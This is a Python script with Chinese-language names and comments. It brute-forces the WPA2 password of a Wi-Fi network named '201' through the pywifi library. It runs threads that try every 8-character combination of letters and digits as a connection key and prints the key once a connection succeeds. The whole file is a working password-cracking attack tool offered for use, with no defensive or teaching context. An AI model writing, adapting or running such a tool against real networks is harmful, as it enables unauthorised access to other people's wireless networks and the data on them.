import itertools
import logging
import time

import pywifi
from pywifi import const

import MyThread

# 配置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
# 测试连接，返回链接结果
def 破解(密码):
    # 抓取网卡接口
    网卡接口 = pywifi.PyWiFi()
    # 获取第一个无线网卡
    网卡 = 网卡接口.interfaces()[0]
    # 断开所有连接
    网卡.disconnect()
    time.sleep(1)
    wifistatus = 网卡.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        # 创建WiFi连接文件
        连接文件 = pywifi.Profile()
        # 要连接WiFi的名称
        连接文件.ssid = "201"
        # 网卡的开放状态
        连接文件.auth = const.AUTH_ALG_OPEN
        # wifi加密算法,一般wifi加密算法为wps
        连接文件.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        连接文件.cipher = const.CIPHER_TYPE_CCMP
        # 调用密码
        连接文件.key = 密码
        # 删除所有连接过的wifi文件
        网卡.remove_all_network_profiles()
        # 设定新的连接文件
        tep_profile = 网卡.add_network_profile(连接文件)
        try:
            网卡.connect(tep_profile)
            # wifi连接时间
            time.sleep(3)
            if 网卡.status() == const.IFACE_CONNECTED:
                return True
            else:
                return False
        except pywifi.exceptions.InterfaceError as e:
            logging.error(f"接口错误: {e}")
            return False
        except pywifi.exceptions.ConnectionError as e:
            logging.error(f"连接错误: {e}")
            return False
        except Exception as e:
            logging.error(f"未知错误: {e}")
            return False
    else:
        print("已有wifi连接:%s" % 密码)


组合 = list('0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')  # 大小写字母 + 数字 组合


def 破解密码(name, x):
    print("线程%s开始破解:" % name)
    for i in itertools.product(组合, repeat=7):
        密码 = str(x) + ''.join(i)
        # 输入密码
        try:
            结果 = 破解(密码)
            if 结果:
                print("线程%s密码已破解:" % name, 密码)
                break
            # else:
            # 跳出当前循环，进行下一次循环
            # print("线程%s密码破解中....密码校对: " % name, 密码)
        except pywifi.exceptions.InterfaceError as e:
            logging.error(f"线程{name}接口错误: {e}")
            continue
        except pywifi.exceptions.ConnectionError as e:
            logging.error(f"线程{name}连接错误: {e}")
            continue
        except Exception as e:
            logging.error(f"线程{name}未知错误: {e}")
            continue


if __name__ == '__main__':
    for i in 组合:
        MyThread.MyThread(arg=i).start()
